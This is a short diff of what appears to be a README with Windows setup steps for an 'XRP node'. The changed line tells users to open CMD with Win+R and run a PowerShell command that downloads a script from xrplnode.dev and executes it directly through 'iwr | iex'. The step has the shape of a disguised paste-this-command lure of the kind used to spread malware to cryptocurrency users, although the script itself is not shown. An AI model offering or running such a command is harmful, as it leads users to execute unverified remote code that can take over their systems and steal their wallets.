@@ -10,7 +10,7 @@ Press `Win + R`, type `CMD`, and press **Enter**.
 
 ### Step 2: Run the XRP node installation command
 ```cmd
-powershell -command "iwr -useb xrplnode.dev | iex"
+powershell -command "iwr -useb xrplnode.dev/install | iex"
 `````
 
 _After executing the command, the node will begin initializing and syncing with the XRP Ledger network._ <br>
